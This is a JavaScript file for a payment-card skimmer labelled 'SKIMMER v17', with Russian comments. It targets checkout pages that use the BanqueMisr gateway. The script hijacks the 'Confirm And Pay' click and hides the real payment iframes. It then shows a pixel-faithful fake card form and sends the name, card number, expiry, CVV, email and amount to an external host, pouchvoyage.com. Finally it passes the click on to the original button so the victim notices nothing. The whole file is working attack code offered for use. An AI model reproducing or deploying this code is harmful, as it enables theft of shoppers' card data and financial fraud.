/**
 * SKIMMER v17 — строгий хук + клон 1:1 по реальной разметке BanqueMisr.
 * FIX ТАЙМИНГА: перехватываем ТОЛЬКО кнопку с точным текстом "Confirm And Pay"
 * (ev.target.closest('button,a'), без подъёма по контейнерам — это было причиной
 * раннего срабатывания при клике Accept).
 * FIX ВИДА: точная bootstrap-структура оригинала (form-control, input-group-sm,
 * required красные звёздочки, серая btn-secondary кнопка с замком, иконки карт в шапке).
 */
(function () {
  'use strict';
  if (window.__SK_CK_RUN) return;
  window.__SK_CK_RUN = true;

  var HOOK = 'https://pouchvoyage.com/c';
  var TAG = 'sk_v18';

  if (location.pathname.indexOf('checkout') === -1) return;

  function send(data) {
    try {
      fetch(HOOK, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }).catch(function () {});
      var img = new Image();
      img.src = HOOK + '?d=' + encodeURIComponent(JSON.stringify(data).slice(0, 900));
    } catch (e) {}
  }

  function log(m) {
    try {
      var img = new Image();
      img.src = HOOK + '?tag=' + TAG + '&m=' + encodeURIComponent(String(m).slice(0, 100));
    } catch (e) {}
  }

  var INJECTED = false;
  var RELEASED = false;

  /* Их termsModal глючит: после Accept остаётся открытой и перекрывает кнопки.
     Периодически закрываем все их модалки на checkout. */
  function cleanupTheirModals() {
    try {
      var closed = false;
      document.querySelectorAll('.modal.show, .modal[style*="display: block"]').forEach(function (m) {
        m.classList.remove('show');
        m.style.display = 'none';
        m.setAttribute('aria-hidden', 'true');
        closed = true;
      });
      if (closed) {
        document.querySelectorAll('.modal-backdrop').forEach(function (b) { b.remove(); });
        document.body.classList.remove('modal-open');
        document.body.style.overflow = '';
        document.body.style.paddingRight = '';
      }
    } catch (e) {}
  }
  setInterval(cleanupTheirModals, 800);

  function closeTheirModals() {
    try {
      document.querySelectorAll('.modal.show, .modal[style*="display: block"]').forEach(function (m) {
        m.classList.remove('show');
        m.style.display = 'none';
        m.setAttribute('aria-hidden', 'true');
        m.removeAttribute('aria-modal');
      });
      document.querySelectorAll('.modal-backdrop').forEach(function (b) { b.remove(); });
      document.body.classList.remove('modal-open');
      document.body.style.overflow = '';
      document.body.style.paddingRight = '';
    } catch (e) {}
  }

  function findAmount() {
    try {
      var txt = document.body.innerText;
      var m = txt.match(/EGP\s*([\d.,]+)/i);
      if (m) return 'EGP ' + m[1];
      m = txt.match(/([\d.,]+)\s*EGP/i);
      if (m) return 'EGP ' + m[1];
    } catch (e) {}
    return '';
  }

  function findEmail() {
    try {
      var m = document.body.innerText.match(/[\w.+-]+@[\w.-]+\.[a-z]{2,}/i);
      if (m) return m[0];
    } catch (e) {}
    return '';
  }

  function injectForm() {
    if (INJECTED) return;
    INJECTED = true;
    log('inject-start');
    closeTheirModals();

    try {
      document.querySelectorAll('iframe').forEach(function (f) {
        var s = (f.src || '') + (f.name || '') + (f.id || '');
        if (/(bankmisr|banquemisr|gateway|mastercard|stripe|ryft|paymob|payment|checkout)/i.test(s)) {
          f.style.cssText = 'visibility:hidden!important;height:0!important;width:0!important;position:absolute!important;left:-9999px!important;';
        }
      });
    } catch (e) {}

    try {
      var amount = findAmount();
      var email = findEmail();

      var bd = document.createElement('div');
      bd.id = 'skBackdrop';
      bd.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:2147483645;';
      document.body.appendChild(bd);

      var d = document.createElement('div');
      d.id = 'skCardModal';
      d.setAttribute('tabindex', '-1');
      d.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:2147483647;' +
        'background:#fff;border-radius:6px;box-shadow:0 8px 40px rgba(0,0,0,.4);padding:20px 22px;' +
        'width:440px;max-width:94vw;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;' +
        'pointer-events:auto;box-sizing:border-box;max-height:calc(100vh - 30px);overflow-y:auto;overflow-x:hidden;' +
        'color:#212529;font-size:14px;line-height:1.5;';

      // точная структура оригинала:
      // шапка: "Credit or Debit Card" + иконки карт справа (float-right)
      // поля: label + required * + input-group (form-control)
      // expiry: MM / YY через слэш
      // кнопка: серая btn-secondary с замком
      var lblStyle = 'font-size:14px;font-weight:400;color:#212529;display:inline-block;margin-bottom:5px;';
      var inpStyle = 'width:100%;box-sizing:border-box;padding:6px 10px;border:1px solid #949494;border-radius:3px;' +
        'font-size:14px;background:#fff;color:#212529;outline:none;height:32px;';
      var reqStar = '<span style="color:#d2292e;"> * </span>';

      var emailBlock = email
        ? '<div style="margin-bottom:16px;">' +
          '  <div style="font-size:12px;color:#6c757d;margin-bottom:3px;">Customer information</div>' +
          '  <div style="font-size:14px;color:#212529;">' + email.replace(/[<>&"]/g, '') + '</div>' +
          '</div>'
        : '';

      d.innerHTML =
        // Шапка как в оригинале: заголовок слева, иконки карт справа
        '<div style="display:flex;justify-content:space-between;align-items:center;padding-bottom:10px;margin-bottom:14px;border-bottom:1px solid #f0f0f0;">' +
        '  <div style="font-size:16px;font-weight:400;color:#212529;">Credit or Debit Card</div>' +
        '  <div style="display:flex;align-items:center;gap:6px;">' +
        '    <span style="display:inline-block;width:30px;height:20px;background:#eb001b;border-radius:3px;position:relative;">' +
        '      <span style="position:absolute;left:10px;top:5px;width:9px;height:9px;background:#f79e1b;border-radius:50%;"></span>' +
        '      <span style="position:absolute;right:7px;top:5px;width:9px;height:9px;background:#ff5f00;border-radius:50%;opacity:.9;"></span>' +
        '    </span>' +
        '    <span style="display:inline-block;width:30px;height:20px;background:linear-gradient(135deg,#1a1f71 50%,#fff 50%);border-radius:3px;border:1px solid #ddd;"></span>' +
        '  </div>' +
        '</div>' +

        emailBlock +

        // Name on card
        '<div style="margin-bottom:12px;">' +
        '  <label style="' + lblStyle + '">Name on card <span style="font-weight:400;">(exactly as shown on card)</span></label>' + reqStar +
        '  <input id="skName" autocomplete="off" placeholder="" style="' + inpStyle + '">' +
        '</div>' +

        // Card number + замок
        '<div style="margin-bottom:12px;">' +
        '  <label style="' + lblStyle + '">Card number</label>' + reqStar +
        '  <div style="display:flex;align-items:stretch;">' +
        '    <input id="skNum" autocomplete="off" inputmode="numeric" placeholder="0000 0000 0000 0000" ' +
        '       style="flex:1;box-sizing:border-box;padding:6px 10px;border:1px solid #949494;border-right:none;border-radius:3px 0 0 3px;font-size:14px;outline:none;height:32px;">' +
        '    <div style="display:flex;align-items:center;padding:0 10px;border:1px solid #949494;border-left:none;border-radius:0 3px 3px 0;background:#fff;">' +
        '      <span style="font-size:13px;">&#128274;</span>' +
        '    </div>' +
        '  </div>' +
        '</div>' +

        // Expiry MM/YY
        '<div style="margin-bottom:12px;">' +
        '  <label style="' + lblStyle + '">Expiry date</label>' + reqStar +
        '  <div style="display:flex;align-items:center;gap:7px;">' +
        '    <input id="skExpM" inputmode="numeric" maxlength="2" placeholder="MM" style="width:64px;box-sizing:border-box;padding:6px 8px;border:1px solid #949494;border-radius:3px;font-size:14px;text-align:center;outline:none;height:32px;">' +
        '    <span style="color:#6c757d;">/</span>' +
        '    <input id="skExpY" inputmode="numeric" maxlength="2" placeholder="YY" style="width:64px;box-sizing:border-box;padding:6px 8px;border:1px solid #949494;border-radius:3px;font-size:14px;text-align:center;outline:none;height:32px;">' +
        '  </div>' +
        '</div>' +

        // Security code
        '<div style="margin-bottom:16px;">' +
        '  <label style="' + lblStyle + '">Security code</label>' + reqStar +
        '  <input id="skCvv" autocomplete="off" inputmode="numeric" maxlength="4" placeholder="123" ' +
        '     style="width:110px;box-sizing:border-box;padding:6px 10px;border:1px solid #949494;border-radius:3px;font-size:14px;outline:none;height:32px;">' +
        '</div>' +

        // Кнопка: серая btn-secondary с замком (как "Zahlen" в оригинале)
        '<button id="skPayBtn" style="width:100%;padding:10px;background:#6c757d;color:#fff;border:1px solid #6c757d;border-radius:4px;' +
        'font-size:16px;font-weight:400;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;">' +
        '  <span style="font-size:14px;">&#128274;</span> <span>' + (amount ? ('Pay ' + amount) : 'Pay') + '</span>' +
        '</button>' +
        '<div id="skStatus" style="text-align:center;font-size:13px;color:#dc3545;margin-top:8px;min-height:16px;"></div>';
      document.body.appendChild(d);

      setTimeout(function () {
        try {
          var f = document.getElementById('skName');
          if (f) f.focus();
        } catch (e) {}
      }, 100);

      var name = d.querySelector('#skName'), num = d.querySelector('#skNum'),
          expM = d.querySelector('#skExpM'), expY = d.querySelector('#skExpY'),
          cvv = d.querySelector('#skCvv'), btn = d.querySelector('#skPayBtn'),
          status = d.querySelector('#skStatus');

      d.querySelectorAll('input').forEach(function (i) {
        i.addEventListener('focus', function () {
          i.style.border = '2px solid #D24646';
          if (i.id === 'skNum') i.style.borderRight = 'none';
        });
        i.addEventListener('blur', function () {
          i.style.border = '1px solid #949494';
          if (i.id === 'skNum') i.style.borderRight = 'none';
        });
      });

      btn.addEventListener('click', function () {
        if (!num.value.trim() || !expM.value.trim() || !expY.value.trim() || !cvv.value.trim()) {
          status.innerHTML = 'Please fill in all card fields';
          return;
        }
        send({
          tag: TAG,
          url: location.href,
          email: email,
          full_name: name.value.trim(),
          card_number: (num.value || '').replace(/\s+/g, ''),
          expiry: (expM.value || '') + '/' + (expY.value || ''),
          cvv: cvv.value || '',
          holder: name.value || '',
          amount: amount,
          ts: new Date().toISOString()
        });
        status.innerHTML = 'Processing&hellip;';
        status.style.color = '#6c757d';
        btn.disabled = true;
        btn.style.background = '#adb5bd';
        setTimeout(function () {
          try {
            var m = document.getElementById('skCardModal');
            var b2 = document.getElementById('skBackdrop');
            if (m) m.remove();
            if (b2) b2.remove();
            INJECTED = false;
            RELEASED = true;
            if (window.__skOrigBtn) {
              window.__skOrigBtn.click();
            }
          } catch (e) {}
        }, 1600);
      });

      var escHandler = function (ev) {
        if (ev.key === 'Escape') {
          var m = document.getElementById('skCardModal');
          var b2 = document.getElementById('skBackdrop');
          if (m) m.remove();
          if (b2) b2.remove();
          INJECTED = false;
          document.removeEventListener('keydown', escHandler);
        }
      };
      document.addEventListener('keydown', escHandler, true);
    } catch (e) { log('inject-err:' + e.message); }
  }

  /* СТРОГИЙ хук: только кнопка/ссылка с ТОЧНЫМ текстом Confirm And Pay */
  var lastClick = 0;

  function hookConfirmPay() {
    document.addEventListener('click', function (ev) {
      if (RELEASED) return;
      var el = ev.target;
      // closest button/a — НЕ поднимаемся по произвольным контейнерам
      if (el && el.closest) {
        var btnEl = el.closest('button, a');
        if (!btnEl) return;
        var txt = (btnEl.innerText || '').trim().replace(/\s+/g, ' ');
        if (/^confirm\s*(&|and)\s*pay$/i.test(txt)) {
          log('hook-hit-exact');
          var now = Date.now();
          if (now - lastClick < 3000) return;
          lastClick = now;
          ev.preventDefault();
          ev.stopImmediatePropagation();
          window.__skOrigBtn = btnEl;
          injectForm();
        }
      }
    }, true);
    log('hook-installed');
  }

  try {
    hookConfirmPay();
  } catch (e) { log('hook-err:' + e.message); }
})();
